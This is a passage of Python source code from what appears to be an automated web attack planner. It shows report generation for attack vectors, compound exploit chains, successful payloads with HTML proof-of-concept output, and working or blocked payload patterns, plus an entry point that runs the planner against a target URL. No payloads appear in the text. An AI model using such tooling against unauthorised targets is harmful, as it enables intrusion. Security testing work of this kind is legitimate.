        for v in sorted(self.state.vectors, key=lambda x: x.success_probability, reverse=True)[:10]:
            status = "✅" if v.successful else "❌" if v.attempted else "⏳"
            report += f"| {status} {v.name[:30]} | {v.type} | {v.success_probability:.0%} | {v.impact_score:.0%} |\n"
        
        report += f"""
## Compound Attack Chains

"""
        if chains:
            for i, chain in enumerate(chains, 1):
                report += f"""### {i}. {chain.name}

**Probability:** {chain.combined_probability:.0%}
**Impact:** {chain.combined_impact:.0%}

Steps:
"""
                for j, step in enumerate(chain.steps, 1):
                    report += f"{j}. {step.name} ({step.type})\n"
                report += "\n"
        else:
            report += "_No compound chains identified_\n"
        
        report += f"""
## Successful Exploits

"""
        if self.exploits:
            for i, exploit in enumerate(self.exploits, 1):
                report += f"""### {i}. {exploit['type']}

**Payload:** `{exploit.get('payload', 'N/A')[:100]}`
**Evidence:** {json.dumps(exploit.get('evidence', {}), indent=2)[:500]}

"""
                if exploit.get("poc"):
                    report += f"""**PoC:**
```html
{exploit['poc'][:1500]}
```

"""
        else:
            report += "_No successful exploits_\n"
        
        report += f"""
## Learning Summary

**Blocked Patterns:** {len(self.state.blocked_patterns)}
**Working Patterns:** {len(self.state.working_patterns)}

### Working Payloads
"""
        for p in list(self.state.working_patterns)[:5]:
            report += f"- `{p[:80]}`\n"
        
        report += """
### Blocked Payloads
"""
        for p in list(self.state.blocked_patterns)[:5]:
            report += f"- `{p[:80]}`\n"
        
        return report


# =============================================================================
# MAIN ENTRY POINT
# =============================================================================

async def neural_attack_plan(
    target_url: str,
    initial_findings: List[dict] = None,
    http_client=None,
    rate_limiter=None,
    max_iterations: int = 20,
) -> Tuple[List[Dict], List[ExploitChain], str]:
    """
    Execute neural attack planning.
    
    Returns:
        Tuple of (exploits, chains, report)
    """
    planner = NeuralAttackPlanner(http_client, rate_limiter)
    return await planner.plan_and_execute(
        target_url,
        initial_findings or [],
        max_iterations,
    )
